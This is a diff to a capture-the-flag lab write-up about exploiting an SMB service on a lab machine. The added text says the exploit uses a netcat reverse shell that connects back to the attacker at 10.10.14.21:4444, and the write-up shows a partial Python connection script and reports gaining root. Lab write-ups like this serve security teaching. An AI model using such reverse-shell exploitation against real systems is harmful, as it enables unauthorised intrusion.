@@ -108,6 +108,8 @@ from our shell. I'll exploit this using a script.
 I'll start off by showing the 'best practice' exploit, by writing a python script. All this script will do is attempt to connect to the
 vulnerable system with the corrupt username and then the payload.  
 
+The payload I'm using is a netcat reverse shell, so that the system connects back to us at `10.10.14.21:4444` and gives us a new shell instance:
+
 ```python
 #!/usr/bin/python3
 from smb.SMBConnection import SMBConnection
@@ -119,7 +121,7 @@ connection = SMBConnection(username, "", "", "")
 connection.connect("10.10.10.3",445)
 ```
   
-`10.10.14.21 4444` is my local host and port, and `10.10.10.3 445` is the remote host and port. 
+`10.10.10.3 445` is the remote host and port.  
 This was a simple enough script, but necessary since the payload cannot be injected via smbclient. I set up a netcat listener on another
 terminal and got root access; both flags captured.  
 
